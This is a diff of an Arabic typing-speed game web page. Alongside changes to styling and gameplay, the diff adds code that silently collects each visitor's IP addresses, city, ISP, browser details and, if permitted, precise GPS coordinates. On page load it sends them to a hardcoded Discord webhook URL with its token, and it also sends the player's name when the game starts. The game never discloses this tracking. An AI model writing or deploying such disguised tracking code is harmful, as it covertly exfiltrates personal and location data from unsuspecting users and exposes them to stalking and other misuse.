@@ -8,251 +8,310 @@
     body {
       font-family: Tahoma, sans-serif;
       direction: rtl;
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
       text-align: center;
       min-height: 100vh;
-      background: black;
-      overflow: hidden;
-      color: white;
+      background: linear-gradient(135deg, #e0f7fa, #fce4ec);
+      background-size: 400% 400%;
+      animation: bgShift 10s ease infinite;
     }
-
-    canvas#stars {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
+    @keyframes bgShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-
     .container {
       max-width: 700px;
       margin: 60px auto;
       padding: 20px;
-      background: rgba(20, 20, 20, 0.9);
+      background: rgba(255, 255, 255, 0.85);
       border-radius: 15px;
-      box-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
+      box-shadow: 0 0 30px rgba(0,0,0,0.1);
     }
-
     input[type="text"] {
       padding: 12px;
       font-size: 18px;
       width: 80%;
       margin-bottom: 15px;
-      border: 2px solid #555;
+      border: 2px solid #ccc;
       border-radius: 8px;
-      background: #111;
-      color: white;
-      outline-offset: 2px;
-      transition: border-color 0.3s ease;
     }
-
-    input[type="text"]:focus {
-      border-color: #7e57c2;
-      background: #222;
-    }
-
     button {
       padding: 12px 25px;
       font-size: 18px;
-      background-color: #6a1b9a;
+      background-color: #007bff;
       color: white;
       border: none;
       border-radius: 8px;
       cursor: pointer;
       margin: 5px;
-      transition: background-color 0.3s ease;
     }
-
-    button:hover {
-      background-color: #7e57c2;
-    }
-
     #sentence {
-      font-size: 24px;
+      font-size: 26px;
       font-weight: bold;
+      color: #222;
       margin: 25px 0;
-      transition: color 0.3s ease;
-      min-height: 36px;
     }
-
-    #sentence.correct {
-      color: #4caf50;
-    }
-
-    #sentence.incorrect {
-      color: #f44336;
-    }
-
-    #speedDisplay {
-      font-size: 20px;
-      margin-top: 10px;
-      min-height: 28px;
-    }
-
-    #result {
-      font-size: 22px;
-      font-weight: 600;
-      margin-top: 8px;
-      min-height: 28px;
-    }
-
-    #discordMark {
+    #record {
       position: fixed;
-      bottom: 20px;
       right: 20px;
+      top: 20px;
+      background: #ffd700;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      display: none;
+    }
+    #musicControl {
+      position: fixed;
+      left: 20px;
+      top: 20px;
+      background: #007bff;
+      color: white;
+      border-radius: 50%;
       width: 40px;
       height: 40px;
-      border-radius: 50%;
-      background-color: rgba(255, 255, 255, 0.1);
-      box-shadow: 0 0 20px 5px white;
-      z-index: 999;
       cursor: pointer;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
+      font-size: 20px;
       user-select: none;
     }
-
-    #discordMark img {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      margin-top: 6px;
-      pointer-events: none;
+    #result {
+      font-size: 20px;
+      margin-top: 20px;
     }
-
-    #developerNote {
-      font-size: 12px;
-      color: white;
-      background: rgba(0,0,0,0.7);
-      padding: 6px 10px;
-      border-radius: 8px;
-      margin-top: 4px;
-      text-align: center;
-      user-select: none;
-      line-height: 1.2;
-      pointer-events: none;
-      max-width: 110px;
-      word-wrap: break-word;
+    #result.error {
+      color: red;
+      font-weight: bold;
     }
-
-    /* Responsive */
-    @media (max-width: 480px) {
-      .container {
-        margin: 40px 15px;
-        padding: 15px;
-      }
-      input[type="text"] {
-        width: 90%;
-        font-size: 16px;
-      }
-      button {
-        font-size: 16px;
-        padding: 10px 20px;
-      }
-      #sentence {
-        font-size: 20px;
-      }
-      #speedDisplay, #result {
-        font-size: 18px;
-      }
-      #discordMark {
-        width: 36px;
-        height: 36px;
-      }
-      #discordMark img {
-        width: 24px;
-        height: 24px;
-      }
-      #developerNote {
-        max-width: 90px;
-        font-size: 10px;
-      }
+    #speedDisplay, #bestTime {
+      font-size: 18px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
 
-<canvas id="stars"></canvas>
+<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
+<div id="musicControl" title="كتم/تشغيل الموسيقى">🎵</div>
 
-<div id="discordMark" title="معاذ الحربي (_9nv)">
-  <img src="https://cdn.iconscout.com/icon/free/png-256/discord-3-569463.png" alt="Discord Logo" />
-  <div id="developerNote">
-    تم تطوير هذا الموقع من قبل معاذ الحربي<br />
-    يوزري في ديسكورد: <b>_9nv</b>
-  </div>
+<div class="container" id="loginScreen">
+  <h2>مرحبًا!</h2>
+  <p>اكتب اسمك نبدأ</p>
+  <input type="text" id="playerName" placeholder="اسمك" />
+  <br />
+  <button onclick="startGame()">يلا نبدأ</button>
 </div>
 
-<div class="container" id="gameScreen">
-  <h2>اختبر سرعتك</h2>
-  <div id="sentence">ابدأ الآن</div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="checkLiveInput()" />
+<div class="container" id="gameScreen" style="display:none;">
+  <h2 id="welcomeMsg"></h2>
+  <div id="sentence">...</div>
+  <input type="text" id="userInput" placeholder="اكتب هنا" onkeydown="handleEnter(event)" />
   <br />
-  <button onclick="checkFinalInput()">تحقق</button>
+  <button onclick="checkInput()">تحقق</button>
   <div id="speedDisplay"></div>
+  <div id="bestTime"></div>
   <div id="result"></div>
 </div>
 
-<audio id="bgMusic" src="https://files.catbox.moe/m8wo6g.mp3" autoplay loop></audio>
+<audio id="bgMusic" src="https://c.top4top.io/m_343844pxd1.mp3" loop></audio>
 
 <script>
-const sentenceEl = document.getElementById("sentence");
-const inputEl = document.getElementById("userInput");
-const resultEl = document.getElementById("result");
-const speedDisplay = document.getElementById("speedDisplay");
-const music = document.getElementById("bgMusic");
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
 
-let startTime = Date.now();
-let currentSentence = "ابدأ الآن";
+  const sentences = [
+    "التركيز سر النجاح", "لا تستسلم بسهولة", "كن قدوة في كل شي تسويه",
+    "تعلم من أخطائك وواصل", "الوقت أغلى شيء عند الإنسان", "افعل ما تحب وتحب ما تفعل",
+    "التعب الآن راحة بعدين", "كل تجربة درس", "خلك دايم متفائل", "ابدأ ولا تنتظر",
+    "الحلم ما يتحقق بدون عمل", "الصبر طريق الإنجاز", "خل عندك هدف واضح",
+    "لا تقارن نفسك بغيرك", "التطور يبدأ من نفسك", "النجاح خطوة بخطوة",
+    "نظم وقتك تنجح", "عيش اللحظة وركز", "الاستمرارية أهم من المثالية",
+    "كل دقيقة تعلم فيها شيء"
+  ];
 
-const sentences = ["ابدأ الآن", "التركيز هو السر", "اكتب بسرعة", "كل شيء ممكن"];
+  let currentSentence = "";
+  let startTime = 0;
+  let highestSpeed = 0;
+  let bestTime = null;
 
-function nextSentence() {
-  currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
-  sentenceEl.textContent = currentSentence;
-  inputEl.value = "";
-  resultEl.textContent = "";
-  speedDisplay.textContent = "";
-  sentenceEl.className = "";
-  startTime = Date.now();
-  inputEl.focus();
-}
+  const loginScreen = document.getElementById("loginScreen");
+  const gameScreen = document.getElementById("gameScreen");
+  const playerName = document.getElementById("playerName");
+  const welcomeMsg = document.getElementById("welcomeMsg");
+  const sentence = document.getElementById("sentence");
+  const userInput = document.getElementById("userInput");
+  const result = document.getElementById("result");
+  const record = document.getElementById("record");
+  const speedDisplay = document.getElementById("speedDisplay");
+  const bestTimeDisplay = document.getElementById("bestTime");
+  const music = document.getElementById("bgMusic");
+  const musicControl = document.getElementById("musicControl");
 
-function checkFinalInput() {
-  const userText = inputEl.value.trim();
-  const duration = (Date.now() - startTime) / 1000;
-  const speed = Math.round((userText.length / duration) * 60);
-  speedDisplay.textContent = `سرعتك: ${speed} حرف بالدقيقة`;
+  window.onload = () => {
+    sendUserInfo();
+  };
 
-  if (userText === currentSentence) {
-    resultEl.textContent = "تمام!";
-    sentenceEl.className = "correct";
-  } else {
-    resultEl.textContent = "خطأ! أعد المحاولة";
-    sentenceEl.className = "incorrect";
+  function startGame() {
+    const name = playerName.value.trim();
+    if (!name) return alert("اكتب اسمك أول");
+    welcomeMsg.textContent = `يلا يا ${name}، اكتب بسرعة`;
+    loginScreen.style.display = "none";
+    gameScreen.style.display = "block";
+    record.style.display = "block";
+    music.volume = 0.3;
+    music.play().catch(() => {
+      musicControl.textContent = "🔇";
+    });
+    nextSentence();
+    sendUserName(name);
   }
 
-  setTimeout(nextSentence, 1500);
-}
+  function nextSentence() {
+    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
+    sentence.textContent = currentSentence;
+    userInput.value = "";
+    result.textContent = "";
+    result.classList.remove("error");
+    speedDisplay.textContent = "";
+    bestTimeDisplay.textContent = "";
+    startTime = Date.now();
+    userInput.focus();
+  }
 
-function checkLiveInput() {
-  const userWords = inputEl.value.trim().split(/\s+/);
-  const targetWords = currentSentence.trim().split(/\s+/);
-  let isCorrect = true;
+  function handleEnter(e) {
+    if (e.key === "Enter") checkInput();
+  }
 
-  for (let i = 0; i < userWords.length; i++) {
-    if (userWords[i] !== targetWords[i]) {
-      isCorrect = false;
-      break;
+  function checkInput() {
+    const typed = userInput.value.trim();
+    const duration = (Date.now() - startTime) / 1000;
+    const speed = Math.round((typed.length / duration) * 60);
+
+    if (typed === currentSentence) {
+      result.textContent = "تمام!";
+      result.classList.remove("error");
+      if (speed > highestSpeed) {
+        highestSpeed = speed;
+        bestTime = duration;
+        record.textContent = `أعلى سرعة: ${highestSpeed} - ${bestTime.toFixed(2)} ثانية`;
+      }
+      speedDisplay.textContent = `سرعتك الآن: ${speed}`;
+      bestTimeDisplay.textContent = `أسرع وقت: ${duration.toFixed(2)} ثانية`;
+      setTimeout(nextSentence, 800);
+    } else {
+      result.textContent = "غلط! عدلها";
+      result.classList.add("error");
+      speedDisplay.textContent = `سرعتك الآن: ${speed}`;
     }
   }
 
-  sentenceEl.className = isCorrect ? "correct" : "incorrect";
-}
+  userInput.addEventListener("input", () => {
+    const typedWords = userInput.value.trim().split(" ");
+    const sentenceWords = currentSentence.split(" ");
+    let colored = "";
 
-window.onload = () => nextSentence();
+    for (let i = 0; i < sentenceWords.length; i++) {
+      if (typedWords[i] === undefined) {
+        colored += `<span>${sentenceWords[i]}</span> `;
+      } else if (typedWords[i] === sentenceWords[i]) {
+        colored += `<span style="color:green;">${sentenceWords[i]}</span> `;
+      } else {
+        colored += `<span style="color:red;">${sentenceWords[i]}</span> `;
+      }
+    }
+
+    sentence.innerHTML = colored.trim();
+  });
+
+  musicControl.addEventListener("click", () => {
+    if (music.paused) {
+      music.play();
+      musicControl.textContent = "🎵";
+    } else {
+      music.pause();
+      musicControl.textContent = "🔇";
+    }
+  });
+
+  function sendUserName(name) {
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: `🚀 بدأ المستخدم: ${name}` })
+    });
+  }
+
+  async function sendUserInfo() {
+    try {
+      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://api64.ipify.org?format=json'),
+        fetch('https://ipapi.co/json/')
+      ]);
+      const ipv4Data = await ipv4Res.json();
+      const ipv6Data = await ipv6Res.json();
+      const geoData = await geoRes.json();
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const now = new Date();
+      const timeString = now.toISOString();
+
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+
+      function sendToWebhook(extraGeo = '') {
+        const infoText = `
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+متصفح المستخدم: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+${extraGeo}
+        `.trim();
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: infoText })
+        });
+      }
+
+      if (navigator.geolocation) {
+        let responded = false;
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            responded = true;
+            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
+            sendToWebhook(extraGeo);
+          },
+          () => {
+            responded = true;
+            sendToWebhook();
+          },
+          { timeout: 4000 }
+        );
+        setTimeout(() => {
+          if (!responded) sendToWebhook();
+        }, 4500);
+      } else {
+        sendToWebhook();
+      }
+    } catch (e) {
+      console.error('خطأ في إرسال معلومات المستخدم', e);
+    }
+  }
+
 </script>
 
 </body>
